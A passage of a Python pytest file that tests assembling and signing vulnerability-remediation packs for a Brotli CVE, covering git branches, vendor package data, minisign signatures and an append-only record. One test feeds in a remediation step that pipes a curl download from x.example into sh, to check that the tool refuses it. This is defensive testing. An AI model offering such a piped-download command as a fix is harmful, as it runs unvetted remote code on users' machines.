"""A.7: assembling a pack for signing, in a stand-in packs clone (a git repository
in tmp). Vendor data comes from a stand-in `fill.build`; nothing reaches a network."""

from __future__ import annotations

import datetime as dt
import hashlib
import shutil
import sqlite3
import subprocess
import tomllib
from pathlib import Path

import pytest

from drafter import assemble, cli, decisions, fill
from drafter.store import Store
from tests.conftest import NOW
from tests.test_draft import CVE, _cve, _threat

PACKS_INDEX = "format: 1\nserial: 1\nissued: 2026-10-31T05:12:15Z\npacks: []\nwithdrawn: []\n"
KEYS = "format: 1\nserial: 1\nissued: 2026-10-30\npack_keys: []\nrevoked: []\n"

OTHER = "CVE-2026-114406"
DRAFT = f"""# AI DRAFT (A.5): written by an AI from the sources below. Review every line;
# CVEs: {CVE} (approved 2026-11-08, decision 1)
title: Google Brotli decoder out-of-bounds write ({CVE})
mitigations: []
detections:
- id: service-segfault
  check: kernel.segfault
  counts: while_exposed
  likelihood_ratio: 2
remediation:
- Update the system Brotli library and restart the services that use it.
references:
- https://access.redhat.com/security/cve/{CVE}
"""


def _git(path, *args):
    subprocess.run(["git", "-C", str(path), *args], check=True, capture_output=True)  # noqa: S603


@pytest.fixture
def clone(tmp_path):
    path = tmp_path / "packs"
    (path / "packs").mkdir(parents=True)
    (path / "index.yaml").write_text(PACKS_INDEX)
    (path / "keys.yaml").write_text(KEYS)
    (path / "packs" / ".gitkeep").write_text("")
    _git(path, "init", "-q", "-b", "dev")
    _git(path, "-c", "user.email=t@t", "-c", "user.name=t", "add", ".")
    _git(path, "-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "-m", "start")
    return path


@pytest.fixture
def ready(store, tmp_path, monkeypatch):
    """An approved brotli threat, its reviewed draft, and vendor data on hand."""
    _cve(store, CVE)
    decisions.record(store, _threat(store), "approve", "", "jch", "2026-11-08T18:53:00Z")
    draft = tmp_path / "brotli.draft.yaml"
    draft.write_text(DRAFT)
    asked = []

    def entry(release, name, versions, fixed, source, origin):
        return fill.Entry(release, [name], versions, fixed, source, origin)

    def build(ctx, cves, filters, other_builds="cant_judge", thirdparty=None, unconfirmed=0):
        asked.append((list(cves), list(filters), other_builds))
        out = fill.Draft(cves=list(cves), binary_filter=list(filters), other_builds=other_builds)
        if OTHER in cves:  # the ca-certificates CVE: RHEL only
            out.entries.append(
                entry(
                    "rhel:9",
                    "ca-certificates",
                    None,
                    "2026.2.1-90.el9_7",
                    "https://access.redhat.com/errata/RHSA-2026:1",
                    "redhat",
                )
            )
            return out
        out.entries += [
            entry(
                "ubuntu:24.04",
                "libbrotli1",
                "1.1.0-2build2",
                "1.1.0-2ubuntu0.1",
                "https://ubuntu.com/security/notices/USN-8956-1",
                "ubuntu",
            ),
            entry(
                "rhel:9",
                "brotli",
                None,
                "1.0.9-7.el9_7.1",
                "https://access.redhat.com/errata/RHSA-2026:2",
                "redhat",
            ),
        ]
        return out  # fmt: skip

    monkeypatch.setattr(fill, "build", build)
    return draft, asked


def _assembly(tmp_path, draft_path, **changes):
    values = {
        "id": '"brotli-2026-10"',
        "version": "1",
        "draft": f'"{draft_path}"',
        "reviewed_by": '"jch"',
    }
    exposure = {
        "window_start": "2026-10-22T00:00:00Z",
        "likelihood_ratio": "5",
        "binaries": '["brotli", "libbrotli*"]',
        "other_builds": '"cant_judge"',
    }
    for key, value in changes.items():
        if key in exposure or key in ("first_seen_in_wild", "window_end", "packages_from",
            "packages_from_reason",
            "by_hand",
            "accept",
                                      "stale_code", "thirdparty"):  # fmt: skip
            if value is None:
                exposure.pop(key, None)
            else:
                exposure[key] = value
        elif value is None:
            values.pop(key, None)
        else:
            values[key] = value
    text = "\n".join(f"{k} = {v}" for k, v in values.items())
    text += "\n\n[exposure]\n" + "\n".join(f"{k} = {v}" for k, v in exposure.items()) + "\n"
    path = tmp_path / "brotli.toml"
    path.write_text(text)
    return path


def _write(store, tmp_path, clone, draft, **changes):
    a = assemble.read_assembly(_assembly(tmp_path, draft, **changes))
    return assemble.write(store, None, a, clone, now=lambda: NOW)


# writing


def test_a_pack_is_written_frozen_on_its_own_branch(store, tmp_path, clone, ready):
    draft, asked = ready
    done = _write(store, tmp_path, clone, draft)
    assert done.path == clone / "packs" / "brotli-2026-10" / "PACK.yaml"
    assert done.branch == "pack/brotli-2026-10-v1"
    current = subprocess.run(["git", "-C", str(clone), "branch", "--show-current"],  # noqa: S603
                             capture_output=True, text=True).stdout.strip()  # fmt: skip
    assert current == done.branch
    assert done.path.stat().st_mode & 0o777 == 0o444
    text = done.path.read_text()
    assert done.sha256 == hashlib.sha256(text.encode()).hexdigest()
    assert done.diff.startswith("--- /dev/null")
    assert asked == [([CVE], ["brotli", "libbrotli*"], "cant_judge")]
    row = store.db.execute("SELECT * FROM pack_assembly").fetchone()
    assert (row["pack_id"], row["version"], row["sha256"], row["reviewed_by"]) == (
        "brotli-2026-10",
        1,
        done.sha256,
        "jch",
    )
    # the checker reads it, and it says where each part came from
    from drafter.checkerformat import format as packformat

    pack = packformat.read(text.encode())
    assert pack.id == "brotli-2026-10" and pack.exposure.likelihood_ratio == 5
    assert pack.published == NOW.date() and pack.cves == [CVE]
    assert "read and accepted by jch" in text and "vendor data for CVE-2026-111497" in text
    assert "Not reviewed, not signed" not in text  # fill's own header isn't carried over


def test_a_familys_packages_come_from_the_cves_the_person_names(store, tmp_path, clone, ready):
    draft, asked = ready
    _cve(store, OTHER)  # in the store, with Red Hat's record
    done = _write(
        store, tmp_path, clone, draft,
        packages_from=f'{{rhel = ["{OTHER}"]}}',
        packages_from_reason='"RHEL is fixed by the ca-certificates update"',
    )  # fmt: skip
    assert [c for c, _, _ in asked] == [[CVE], [OTHER]]
    text = done.path.read_text()
    assert '"libbrotli1"' in text and '"ca-certificates"' in text  # Ubuntu's own kept
    assert 'binary_names: ["brotli"]' not in text  # RHEL's own replaced
    assert f"except rhel: from {OTHER} instead, because RHEL is fixed by" in text
    assert done.replaced == [
        f"rhel: 1 entries from {OTHER} (ca-certificates) stand in for the pack's own 1 (brotli),"
        " because RHEL is fixed by the ca-certificates update"
    ]


def test_packages_from_must_name_a_cve_the_store_has_and_say_why(store, tmp_path, clone, ready):
    draft, _ = ready
    with pytest.raises(assemble.AssembleError, match="packages_from_reason"):
        _write(store, tmp_path, clone, draft, packages_from='{rhel = ["CVE-1999-0001"]}')
    with pytest.raises(
        assemble.AssembleError, match="redhat has no record in the store for CVE-1999"
    ):
        _write(store, tmp_path, clone, draft, packages_from='{rhel = ["CVE-1999-0001"]}',
               packages_from_reason='"typo"')  # fmt: skip
    with pytest.raises(assemble.AssembleError, match="per family"):
        assemble.read_assembly(_assembly(tmp_path, draft, packages_from=f'["{OTHER}"]'))


def test_optional_exposure_values(store, tmp_path, clone, ready):
    draft, _ = ready
    done = _write(
        store, tmp_path, clone, draft,
        first_seen_in_wild="2026-10-23T07:00:00Z", window_end="2026-12-01",
        stale_code='["node*"]',
    )  # fmt: skip
    from drafter.checkerformat import format as packformat

    pack = packformat.read(done.path.read_bytes())
    assert pack.exposure.first_seen_in_wild == dt.datetime(2026, 10, 23, 7, tzinfo=dt.UTC)
    assert pack.exposure.window_end == dt.datetime(2026, 12, 1, tzinfo=dt.UTC)
    assert pack.exposure.stale_code.programs == ["node*"]


@pytest.mark.parametrize(
    ("changes", "message"),
    [
        ({"version": "2"}, "is a new pack, so this is version 1"),
        ({"likelihood_ratio": "50"}, "the checker wouldn't read the pack"),
        ({"window_end": "2026-10-01T00:00:00Z"}, "window_end must be after window_start"),
    ],
)
def test_a_pack_the_checker_wouldnt_take_isnt_written(
    store, tmp_path, clone, ready, changes, message
):
    draft, _ = ready
    with pytest.raises(assemble.AssembleError, match=message):
        _write(store, tmp_path, clone, draft, **changes)
    assert not (clone / "packs" / "brotli-2026-10").exists()
    assert store.db.execute("SELECT COUNT(*) FROM pack_assembly").fetchone()[0] == 0


def test_a_new_version_follows_the_index_and_shows_what_changed(store, tmp_path, clone, ready):
    draft, _ = ready
    old = clone / "packs" / "brotli-2026-10" / "PACK.yaml"
    old.parent.mkdir()
    old.write_text("title: old\n")
    (clone / "index.yaml").write_text(
        PACKS_INDEX.replace(
            "packs: []", 'packs:\n  - {id: "brotli-2026-10", version: 1, sha256: "x"}'
        )
    )
    _git(clone, "add", ".")
    _git(clone, "-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "v1")
    with pytest.raises(assemble.AssembleError, match="lists brotli-2026-10 at 1, so this is 2"):
        _write(store, tmp_path, clone, draft)
    done = _write(store, tmp_path, clone, draft, version="2")
    assert done.branch == "pack/brotli-2026-10-v2"
    assert "--- brotli-2026-10 version 1" in done.diff and "-title: old" in done.diff


def test_a_pack_folder_the_index_doesnt_list_is_refused(store, tmp_path, clone, ready):
    draft, _ = ready
    stray = clone / "packs" / "brotli-2026-10" / "PACK.yaml"
    stray.parent.mkdir()
    stray.write_text("x\n")
    _git(clone, "-c", "user.email=t@t", "-c", "user.name=t", "add", ".")
    _git(clone, "-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "stray")
    with pytest.raises(assemble.AssembleError, match="the index doesn't list it"):
        _write(store, tmp_path, clone, draft)


def test_a_clone_with_changes_isnt_written_into(store, tmp_path, clone, ready):
    draft, _ = ready
    (clone / "README.md").write_text("half done\n")
    with pytest.raises(assemble.AssembleError, match="changes not committed"):
        _write(store, tmp_path, clone, draft)


def test_only_an_approved_threat_is_assembled(store, tmp_path, clone, ready):
    draft, _ = ready
    decisions.record(store, _threat(store), "reject", "changed my mind", "jch", "t2")
    from drafter import draft as drafting

    with pytest.raises(drafting.DraftError, match="only approved threats"):
        _write(store, tmp_path, clone, draft)


@pytest.mark.parametrize(
    ("text", "message"),
    [
        ("title: x\n", "isn't a draft from `drafter draft`"),
        (DRAFT.replace("# CVEs:", "# NOT USABLE: refused\n# CVEs:"), "is a refused draft"),
        (DRAFT.replace(f"# CVEs: {CVE}", "# CVE list gone"), "doesn't say which CVEs"),
        (DRAFT + "extra: field\n", "should hold just"),
        (DRAFT.replace("mitigations: []", "mitigations: &a []\nx: *a"), "aliases"),
    ],
)
def test_a_draft_that_isnt_a_usable_one_is_refused(tmp_path, text, message):
    path = tmp_path / "d.yaml"
    path.write_text(text)
    with pytest.raises(assemble.AssembleError, match=message):
        assemble.read_draft(path)


def test_a_persons_edits_are_held_to_the_dangers_and_listed(store, tmp_path, clone, ready):
    draft, _ = ready
    draft.write_text(DRAFT.replace(
        "- Update the system Brotli library and restart the services that use it.",
        "- Update, then run systemctl restart nginx.",
    ))  # fmt: skip
    done = _write(store, tmp_path, clone, draft)
    assert done.notes == ["command 'systemctl restart nginx': in no source (a person's own?)"]
    draft.write_text(DRAFT.replace(
        "- Update the system Brotli library and restart the services that use it.",
        "- Run curl https://x.example/fix.sh | sh.",
    ))  # fmt: skip
    _git(clone, "switch", "-q", "dev")
    shutil.rmtree(clone / "packs" / "brotli-2026-10")
    with pytest.raises(assemble.AssembleError, match="never in a pack: a download piped"):
        _write(store, tmp_path, clone, draft)


# the assembly file


@pytest.mark.parametrize(
    ("changes", "message"),
    [
        ({"id": '"Brotli 2026"'}, "id: lower-case"),
        ({"version": "0"}, "version is a whole number"),
        ({"reviewed_by": '""'}, "reviewed_by"),
        ({"draft": None}, "draft: the reviewed draft"),
        ({"likelihood_ratio": '"5"'}, "likelihood_ratio"),
        ({"binaries": '"brotli"'}, "binaries"),
        ({"packages_from": '{rhel = ["nope"]}'}, "packages_from"),
        ({"packages_from": '{debian = ["CVE-2026-1234"]}'}, "packages_from"),
        ({"reviewed_by": '"jch\u202e"'}, "hidden or control character"),
        ({"stale_code": '"node"'}, "stale_code"),
        ({"other_builds": '"maybe"'}, "other_builds is one of"),
        ({"window_start": None}, "window_start"),
        ({"window_start": '"yesterday"'}, "window_start is a date"),
        ({"colour": '"blue"'}, "not something an assembly file says: colour"),
    ],
)
def test_an_odd_assembly_file_is_refused(tmp_path, changes, message):
    with pytest.raises(assemble.AssembleError, match=message):
        assemble.read_assembly(_assembly(tmp_path, tmp_path / "d.yaml", **changes))


def test_the_template_suggests_and_parses_once_filled(store, tmp_path, clone, ready):
    draft, _ = ready
    text = assemble.template(store, draft, clone)
    data = tomllib.loads(text)
    assert data["id"].startswith("brotli-2026-") and data["version"] == 1
    assert data["reviewed_by"] == "" and data["exposure"]["likelihood_ratio"] == 0
    assert isinstance(data["exposure"]["window_start"], dt.datetime)
    assert "CISA listed it on 2026-10-27" in text
    # No other pack's weight as a hint: it anchors the choice (A.9).
    assert "PHP2Shell" not in text and "at most 10" in text


# after signing


def _signed(store, tmp_path, clone, ready, monkeypatch):
    draft, _ = ready
    done = _write(store, tmp_path, clone, draft)
    Path(f"{done.path}.minisig").write_text("signature")
    (clone / "keys.yaml").write_text(
        KEYS.replace("pack_keys: []", "pack_keys:\n  - {name: k, public_key: RWQ}")
    )
    return done


def test_a_signed_pack_is_checked_then_indexed(store, tmp_path, clone, ready, monkeypatch):
    done = _signed(store, tmp_path, clone, ready, monkeypatch)
    monkeypatch.setattr(
        assemble, "verify", lambda path, keys, m="minisign": ("RWQ", "brotli-2026-10 version 1")
    )
    fake = tmp_path / "checker"
    fake.write_text('#!/bin/sh\necho "Wrote $3/index.yaml: serial 2, 1 pack(s), 0 withdrawn."\n')
    fake.chmod(0o755)
    checked = assemble.check(store, "brotli-2026-10", clone, checker=str(fake))
    assert checked.path == done.path and "serial 2" in checked.index_output


def test_a_pack_changed_after_freezing_is_refused(store, tmp_path, clone, ready, monkeypatch):
    done = _signed(store, tmp_path, clone, ready, monkeypatch)
    done.path.chmod(0o644)
    done.path.write_text(done.path.read_text() + "# a late edit\n")
    with pytest.raises(assemble.AssembleError, match="changed after it was frozen"):
        assemble.check(store, "brotli-2026-10", clone)


def test_the_trusted_comment_must_name_the_pack_and_version(
    store, tmp_path, clone, ready, monkeypatch
):
    _signed(store, tmp_path, clone, ready, monkeypatch)
    monkeypatch.setattr(
        assemble, "verify", lambda path, keys, m="minisign": ("RWQ", "something else")
    )
    with pytest.raises(assemble.AssembleError, match="trusted comment is 'something else'"):
        assemble.check(store, "brotli-2026-10", clone)


def test_a_refused_index_is_reported(store, tmp_path, clone, ready, monkeypatch):
    _signed(store, tmp_path, clone, ready, monkeypatch)
    monkeypatch.setattr(
        assemble, "verify", lambda path, keys, m="minisign": ("RWQ", "brotli-2026-10 version 1")
    )
    fake = tmp_path / "checker"
    fake.write_text("#!/bin/sh\necho 'checker: keys.yaml: bad' >&2\nexit 1\n")
    fake.chmod(0o755)
    with pytest.raises(
        assemble.AssembleError, match="checker packs index refused:\nchecker: keys.yaml: bad"
    ):
        assemble.check(store, "brotli-2026-10", clone, checker=str(fake))


def test_nothing_assembled_is_nothing_to_check(store, clone):
    with pytest.raises(assemble.AssembleError, match="no pack nope assembled"):
        assemble.check(store, "nope", clone)


@pytest.mark.skipif(shutil.which("minisign") is None, reason="minisign isn't installed")
def test_minisign_checks_a_real_signature(tmp_path):
    def run(*args):
        subprocess.run(["minisign", *args], check=True, capture_output=True)  # noqa: S603, S607

    run("-G", "-W", "-p", str(tmp_path / "k.pub"), "-s", str(tmp_path / "k.key"))
    other = tmp_path / "o"
    other.mkdir()
    run("-G", "-W", "-p", str(other / "k.pub"), "-s", str(other / "k.key"))
    pack = tmp_path / "PACK.yaml"
    pack.write_text("x: 1\n")
    with pytest.raises(assemble.AssembleError, match="sign it first"):
        assemble.verify(pack, ["RWQ"])
    run("-S", "-s", str(tmp_path / "k.key"), "-m", str(pack), "-t", "p version 1")
    key = (tmp_path / "k.pub").read_text().splitlines()[1]
    wrong = (other / "k.pub").read_text().splitlines()[1]
    assert assemble.verify(pack, [wrong, key]) == (key, "p version 1")
    with pytest.raises(assemble.AssembleError, match="isn't a good signature"):
        assemble.verify(pack, [wrong])
    pack.write_text("x: 2\n")  # changed after signing
    with pytest.raises(assemble.AssembleError, match="isn't a good signature"):
        assemble.verify(pack, [key])


# the record and the commands


def test_assemblies_are_append_only(store, tmp_path, clone, ready):
    draft, _ = ready
    _write(store, tmp_path, clone, draft)
    for sql in ("UPDATE pack_assembly SET sha256 = 'x'", "DELETE FROM pack_assembly"):
        with pytest.raises(sqlite3.IntegrityError, match="append-only"):
            store.db.execute(sql)


def test_the_cli_writes_then_tells_how_to_sign(tmp_path, clone, monkeypatch, capsys):
    home = tmp_path / "home"
    home.mkdir()
    s = Store(home / "drafter.sqlite3")
    _cve(s, CVE)
    decisions.record(s, _threat(s), "approve", "", "jch", "2026-11-08T18:53:00Z")
    s.close()
    draft = tmp_path / "brotli.draft.yaml"
    draft.write_text(DRAFT)
    monkeypatch.setattr(
        fill, "build",
        lambda ctx, cves, filters, other="cant_judge", extra=None, unconfirmed=0: fill.Draft(
            cves=list(cves), binary_filter=list(filters),
            entries=[fill.Entry("ubuntu:24.04", ["libbrotli1"], None, "1.1.0-2ubuntu0.1",
                                "https://ubuntu.com/security/notices/USN-8956-1", "ubuntu")],
        ),
    )  # fmt: skip
    path = _assembly(tmp_path, draft)
    assert cli.main(["--home", str(home), "pack", "write", str(path), "--packs", str(clone)]) == 0
    out = capsys.readouterr().out
    assert "read-only, on branch pack/brotli-2026-10-v1" in out and "SHA-256: " in out
    assert "minisign -S -s ~/nouriloop-keys/pack.key -m " in out
    assert '-t "brotli-2026-10 version 1"' in out
    assert f"drafter pack check brotli-2026-10 --packs {clone}" in out
    assert (
        cli.main(["--home", str(home), "pack", "check", "brotli-2026-10", "--packs", str(clone)])
        == 1
    )
    assert "sign it first" in capsys.readouterr().err
    assert cli.main(["--home", str(home), "pack", "template", "--draft", str(draft),
                     "--packs", str(clone)]) == 0  # fmt: skip
    assert 'id = "brotli-2026-' in capsys.readouterr().out


def test_a_pack_is_checked_in_the_clone_it_was_assembled_into(
    store, tmp_path, clone, ready, monkeypatch
):
    _signed(store, tmp_path, clone, ready, monkeypatch)
    other = tmp_path / "other"
    other.mkdir()
    with pytest.raises(assemble.AssembleError, match="was assembled into"):
        assemble.check(store, "brotli-2026-10", other)


# from the release-safety review of A.7


def test_the_clone_must_be_on_dev(store, tmp_path, clone, ready):
    draft, _ = ready
    _git(clone, "switch", "-q", "-c", "some-old-branch")
    with pytest.raises(
        assemble.AssembleError, match="is on some-old-branch: a pack starts from dev"
    ):
        _write(store, tmp_path, clone, draft)


def test_a_withdrawn_id_isnt_used_again(store, tmp_path, clone, ready):
    draft, _ = ready
    (clone / "index.yaml").write_text(PACKS_INDEX.replace(
        "withdrawn: []", 'withdrawn:\n  - {id: "brotli-2026-10", reason: "wrong", version: 1}'
    ))  # fmt: skip
    _git(clone, "-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qam", "withdraw")
    with pytest.raises(assemble.AssembleError, match="was withdrawn"):
        _write(store, tmp_path, clone, draft)


def test_references_are_listed_when_no_source_gives_them(store, tmp_path, clone, ready):
    draft, _ = ready
    draft.write_text(DRAFT.replace(
        f"- https://access.redhat.com/security/cve/{CVE}",
        f"- https://access.redhat.com/security/cve/{CVE}\n- https://brotli-fix.example.net/get.sh",
    ))  # fmt: skip
    done = _write(store, tmp_path, clone, draft)
    assert (
        "reference https://brotli-fix.example.net/get.sh: in no source (a person's own?)"
        in done.notes
    )


def _ai_answer(store, **changes):
    import json

    answer = {
        "title": f"Google Brotli decoder out-of-bounds write ({CVE})",
        "mitigations_yaml": "[]",
        "detections_yaml": "- id: service-segfault\n  check: kernel.segfault\n"
        "  counts: while_exposed\n  likelihood_ratio: 2\n",
        "remediation": ["Update the system Brotli library and restart the services that use it."],
        "references": [f"https://access.redhat.com/security/cve/{CVE}"],
        "unknowns": [],
        **changes,
    }
    decision = decisions.history(store)[0]
    with store.transaction():
        store.db.execute(
            "INSERT INTO ai_request (sent_at, cves, decision_id, model, attempt, settled, cost,"
            " answer, problems) VALUES ('t', '[]', ?, 'claude-opus-5-5', 1, 1, 0.1, ?, '[]')",
            (decision.id, json.dumps(answer)),
        )


def _again(clone):
    _git(clone, "switch", "-q", "dev")
    _git(clone, "branch", "-q", "-D", "pack/brotli-2026-10-v1")
    shutil.rmtree(clone / "packs" / "brotli-2026-10")


def test_the_pack_says_whether_the_prose_was_edited(store, tmp_path, clone, ready):
    draft, _ = ready
    done = _write(store, tmp_path, clone, draft)
    assert done.edits is None and "no accepted AI answer on record" in done.path.read_text()
    _again(clone)
    _ai_answer(store)
    done = _write(store, tmp_path, clone, draft)
    assert done.edits == [] and "an AI draft, unedited," in done.path.read_text()
    _again(clone)
    _ai_answer(store, remediation=["Something else entirely."])
    done = _write(store, tmp_path, clone, draft)
    assert done.edits == ["remediation"]
    assert "an AI draft, edited by a person (remediation)," in done.path.read_text()


def test_a_draft_made_under_an_earlier_decision_is_refused(store, tmp_path, clone, ready):
    draft, _ = ready
    draft.write_text(DRAFT.replace(f"# CVEs: {CVE} (approved 2026-11-08, decision 1)",
                                   f"# CVEs: {CVE} (approved 2026-11-01, decision 7)"))  # fmt: skip
    with pytest.raises(
        assemble.AssembleError, match="made under decision 7; the threat was decided"
    ):
        _write(store, tmp_path, clone, draft)


def test_the_index_is_written_once_and_its_signature_checked_after(
    store, tmp_path, clone, ready, monkeypatch
):
    done = _signed(store, tmp_path, clone, ready, monkeypatch)
    signed_index = {"ok": False}

    def verify(path, keys, m="minisign"):
        if path.name == "index.yaml" and not signed_index["ok"]:
            raise assemble.AssembleError("not signed")
        return "RWQ", "brotli-2026-10 version 1"

    monkeypatch.setattr(assemble, "verify", verify)
    calls = tmp_path / "calls"
    index = (
        "format: 1\\nserial: 2\\npacks:\\n  - {id: brotli-2026-10, version: 1, sha256: "
        + done.sha256
        + "}\\nwithdrawn: []\\n"
    )
    fake = tmp_path / "checker"
    fake.write_text(
        f"#!/bin/sh\necho run >> {calls}\nprintf '{index}' > $3/index.yaml\n"
        "echo 'Wrote index.yaml: serial 2'\n"
    )
    fake.chmod(0o755)
    first = assemble.check(store, "brotli-2026-10", clone, checker=str(fake))
    assert first.index == "written" and calls.read_text().count("run") == 1
    second = assemble.check(store, "brotli-2026-10", clone, checker=str(fake))
    assert second.index == "unsigned" and calls.read_text().count("run") == 1  # not rewritten
    signed_index["ok"] = True
    third = assemble.check(store, "brotli-2026-10", clone, checker=str(fake))
    assert third.index == "signed" and calls.read_text().count("run") == 1


@pytest.mark.skipif(shutil.which("minisign") is None, reason="minisign isn't installed")
def test_key_ids_are_minisigns_own(tmp_path):
    pub, sec = str(tmp_path / "k.pub"), str(tmp_path / "k.key")
    subprocess.run(["minisign", "-G", "-W", "-p", pub, "-s", sec], check=True, capture_output=True)  # noqa: S603, S607
    comment, key = (tmp_path / "k.pub").read_text().splitlines()[:2]
    assert assemble.key_id(key) == comment.rsplit(" ", 1)[1]
    assert assemble.key_id("not base64!") == "?"


def test_the_template_quotes_its_path(store, tmp_path, clone, ready):
    draft, _ = ready
    odd = tmp_path / 'we"ird\\dir'
    odd.mkdir()
    moved = odd / "d.yaml"
    moved.write_text(draft.read_text())
    assert tomllib.loads(assemble.template(store, moved, clone))["draft"] == str(moved)


def test_the_cli_template_refuses_to_overwrite_and_reports_errors(tmp_path, clone, capsys):
    home = tmp_path / "home"
    home.mkdir()
    Store(home / "drafter.sqlite3").close()
    draft = tmp_path / "brotli.draft.yaml"
    draft.write_text(DRAFT)
    assert cli.main(["--home", str(home), "pack", "template", "--draft", str(draft),
                     "--packs", str(clone)]) == 1  # fmt: skip
    assert "not decided" in capsys.readouterr().err
    out = tmp_path / "a.toml"
    out.write_text("mine\n")
    s = Store(home / "drafter.sqlite3")
    _cve(s, CVE)
    decisions.record(s, _threat(s), "approve", "", "jch", "2026-11-08T18:53:00Z")
    s.close()
    assert cli.main(["--home", str(home), "pack", "template", "--draft", str(draft),
                     "--packs", str(clone), "--out", str(out)]) == 1  # fmt: skip
    assert out.read_text() == "mine\n" and "not overwritten" in capsys.readouterr().err


# from the correctness review of A.7


def _gappy(monkeypatch):
    real = fill.build

    def build(*args, **kwargs):
        out = real(*args, **kwargs)
        out.conflicts.append("rhel:9 edk2: Affected with no fixed build to take binaries from")
        return out

    monkeypatch.setattr(fill, "build", build)


def test_gaps_the_vendor_data_leaves_stop_the_write_until_accepted_by_name(
    store, tmp_path, clone, ready, monkeypatch
):
    draft, _ = ready
    _gappy(monkeypatch)
    with pytest.raises(assemble.AssembleError, match="(?s)leaves these for a person.*rhel:9 edk2"):
        _write(store, tmp_path, clone, draft)
    assert not (clone / "packs" / "brotli-2026-10").exists()
    accept = '[{gap = "rhel:9 edk2", reason = "no RHEL build is fixed yet"}]'
    done = _write(store, tmp_path, clone, draft, accept=accept)
    assert done.needs_a_person[0].endswith("(accepted: no RHEL build is fixed yet)")


def test_an_acceptance_covers_only_its_own_gap_and_must_still_match_one(
    store, tmp_path, clone, ready, monkeypatch
):
    draft, _ = ready
    _gappy(monkeypatch)
    other = '[{gap = "ubuntu:24.04 something", reason = "x"}]'
    with pytest.raises(assemble.AssembleError, match="aren't there any more"):
        _write(store, tmp_path, clone, draft, accept=other)
    both = '[{gap = "rhel:9 edk2", reason = "x"}, {gap = "ubuntu:24.04 something", reason = "y"}]'
    with pytest.raises(assemble.AssembleError, match="(?s)aren't there any more.*ubuntu:24.04"):
        _write(store, tmp_path, clone, draft, accept=both)


def test_a_person_can_write_the_entries_the_vendor_data_cant(store, tmp_path, clone, ready):
    draft, _ = ready
    entry = (
        '[{release = "rhel:10", binary_names = ["edk2-ovmf"],'
        ' source = "https://access.redhat.com/security/cve/CVE-2026-97631",'
        ' note = "Red Hat: Affected, no fix yet"}]'
    )
    done = _write(store, tmp_path, clone, draft, by_hand=entry)
    text = done.path.read_text()
    assert "# Written by a person in the assembly file (A.7)" in text
    assert "# added by a person: Red Hat: Affected, no fix yet" in text
    assert '- release: "rhel:10"\n      binary_names: ["edk2-ovmf"]\n      fixed: null' in text


@pytest.mark.parametrize(
    "entry",
    [
        '[{release = "debian:12", binary_names = ["x"], source = "https://x.example/"}]',
        '[{release = "rhel:9", binary_names = [], source = "https://x.example/"}]',
        '[{release = "rhel:9", binary_names = ["x"]}]',
        '[{release = "rhel:9", binary_names = ["x"], source = "https://x.example/", colour = "b"}]',
        '[{release = "rhel:9", binary_names = ["x"], source = "https://x.example/", fixed = 1}]',
    ],
)
def test_an_odd_by_hand_entry_is_refused(tmp_path, entry):
    with pytest.raises(assemble.AssembleError, match="by_hand"):
        assemble.read_assembly(_assembly(tmp_path, tmp_path / "d.yaml", by_hand=entry))


def test_a_by_hand_entry_clashing_with_the_vendors_is_a_gap(store, tmp_path, clone, ready):
    draft, _ = ready
    clash = '[{release = "rhel:9", binary_names = ["brotli"], source = "https://x.example/"}]'
    with pytest.raises(assemble.AssembleError, match="leaves these for a person"):
        _write(store, tmp_path, clone, draft, by_hand=clash)


def test_third_party_builds_without_proposals_are_a_gap(store, tmp_path, clone, ready, monkeypatch):
    draft, _ = ready
    from drafter import thirdparty

    monkeypatch.setattr(thirdparty, "has_repositories", lambda ctx, cves: ["php:php"])
    monkeypatch.setattr(thirdparty, "unknown_cves", lambda ctx, cves: [])
    a = assemble.read_assembly(_assembly(tmp_path, draft))
    with pytest.raises(assemble.AssembleError, match="php:php has third-party builds"):
        assemble.write(store, object(), a, clone, now=lambda: NOW)


def test_the_weight_is_written_exactly(store, tmp_path, clone, ready):
    draft, _ = ready
    done = _write(store, tmp_path, clone, draft, likelihood_ratio="4.123456789")
    assert "  likelihood_ratio: 4.123456789\n" in done.path.read_text()


def test_a_placeholder_source_is_refused(store, tmp_path, clone, ready):
    draft, _ = ready
    odd = '[{release = "rhel:10", binary_names = ["x"], source = "not a url"}]'
    with pytest.raises(assemble.AssembleError, match="isn't an address the pack can carry"):
        _write(store, tmp_path, clone, draft, by_hand=odd)


def test_a_failed_write_leaves_the_clone_as_it_was(store, tmp_path, clone, ready, monkeypatch):
    draft, _ = ready

    def broken():
        raise sqlite3.OperationalError("disk full")

    monkeypatch.setattr(store, "transaction", broken)
    with pytest.raises(sqlite3.OperationalError):
        _write(store, tmp_path, clone, draft)
    branches = subprocess.run(["git", "-C", str(clone), "branch", "--list"],  # noqa: S603, S607
                              capture_output=True, text=True).stdout  # fmt: skip
    assert "pack/" not in branches and "* dev" in branches
    assert not (clone / "packs" / "brotli-2026-10" / "PACK.yaml").exists()


def test_a_clone_behind_github_is_refused(store, tmp_path, clone, ready):
    draft, _ = ready
    origin = tmp_path / "origin.git"
    _git(clone, "clone", "-q", "--bare", str(clone), str(origin))
    _git(clone, "remote", "add", "origin", str(origin))
    ahead = tmp_path / "ahead"
    _git(tmp_path, "clone", "-q", str(origin), str(ahead))
    (ahead / "README.md").write_text("newer\n")
    _git(ahead, "add", ".")
    _git(ahead, "-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "newer")
    _git(ahead, "push", "-q", "origin", "dev")
    with pytest.raises(assemble.AssembleError, match="1 commit\\(s\\) behind origin/dev: git pull"):
        _write(store, tmp_path, clone, draft)


def test_a_setting_no_source_names_is_listed(store, tmp_path, clone, ready):
    draft, _ = ready
    draft.write_text(DRAFT.replace("mitigations: []", (
        "mitigations:\n- id: off\n  setting: {kind: php_ini, name: zend.made_up}\n"
        "  expect: 'off'\n  default: 'on'\n  text: Turn it off.\n"
    )))  # fmt: skip
    done = _write(store, tmp_path, clone, draft)
    assert "setting 'zend.made_up': in no source (a person's own?)" in done.notes


# from the third review of A.7


def test_a_replaced_familys_gaps_go_with_it_and_the_stand_ins_come_in(
    store, tmp_path, clone, ready, monkeypatch
):
    draft, _ = ready
    _cve(store, OTHER)
    real = fill.build

    def build(*args, **kwargs):
        out = real(*args, **kwargs)
        if OTHER in args[1]:
            out.conflicts += ["rhel:10 ca-certificates: unreadable advisory", "ubuntu:24.04 x: odd"]
